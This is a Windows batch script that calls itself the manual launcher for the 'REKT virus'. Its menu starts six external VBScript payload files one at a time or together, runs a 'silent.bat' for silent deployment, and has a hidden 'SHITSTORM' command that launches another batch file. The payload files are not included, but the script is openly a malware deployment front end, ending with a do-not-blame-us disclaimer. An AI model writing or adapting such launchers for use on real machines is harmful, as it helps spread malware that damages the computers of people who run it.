@echo off

::Script for manual deployment of the REKT virus.
::You will need the 6 payload files, unchanged.

title REKT (Manual)
cls
for /l %%p in (start, 1, 7) do (
	if "%1" EQU "/%%p" (

		goto %%p
	)
)

::Payloads

:start
echo REKT Virus Launcher v2.0.1&& echo.
echo Do NOT change any file names! To ensure compatibility, keep all files in their original state.&& echo.
echo Type HELP for a list of available commands and some tips.
goto :command

:1
set /a cur=1
echo Starting payload 1...
start payload_1.vbs
goto :command

:2
set /a cur=2
echo Starting payload 2...
start payload_2.vbs
goto :command

:3
set /a cur=3
echo Starting payload 3...
start payload_3.vbs
goto :command

:4
set /a cur=4
echo Starting payload 4...
start payload_4.vbs
goto :command

:5
set /a cur=5
echo Starting payload 5...
start payload_5.vbs
goto :command

:6
set /a cur=6
echo Starting payload 6...
start payload_6.vbs
goto :command

:all
set /a cur=all
echo Starting all payloads...
start payload_1.vbs
start payload_2.vbs
start payload_3.vbs
start payload_4.vbs
start payload_5.vbs
start payload_6.vbs
goto :command

:silent
set /a cur=silent
echo Starting all payloads using silent script (silent.bat)
start silent.bat
goto :command

::Help page & Credits

:help
set /a cur=help
echo Payload-specific commands:&& echo.
echo 1: Starts payload 1
echo 2: Starts payload 2
echo 3: Starts payload 3
echo 4: Starts payload 4
echo 5: Starts payload 5
echo 6: Starts payload 6&& echo.
echo Other commands:&& echo.
echo ALL: Starts all REKT payloads only once. Use SILENT to start in succession.
echo SHITSTORM: Find out yourself ;)
echo HELP: Prints this help window.
echo SILENT: Runs silent.bat for silent deployment of all payloads.
echo CREDITS: Displays developer credits.
echo EXIT: Exits this window.&& echo.
echo WARNING: Use this program at your own risk! The developers are not responsible for any damage!
goto :command

:credits
set /a cur=credits
echo Thanks to:&& echo.
echo James: Providing code to create the commands&& echo.
echo Q.Minh: Yo boi challenged me to make this piece of crap&& echo.
echo By Khanh =)
goto :command

::Go to pages

:command
echo.
echo All commands are case-sensitive.
echo.
set /p ans=^Insert command: 
echo.
for /l %%p in (start, 1, 7) do (
	if "%ans%" EQU "%%p" (
		
		goto %%p
	)
)

::Other commands

if "%ans%" EQU "ALL" (cls && goto :all)
if "%ans%" EQU "EXIT" (cls && exit)
if "%ans%" EQU "HELP" (cls && goto :help)
if "%ans%" EQU "SILENT" (cls && goto :silent)
if "%ans%" EQU "CREDITS" (cls && goto :credits)
if "%ans%" EQU "SHITSTORM" (cls && start shitstorm.bat)

::If invalid command

echo Command not found. Try again with a different command or type HELP into the console.
goto :command
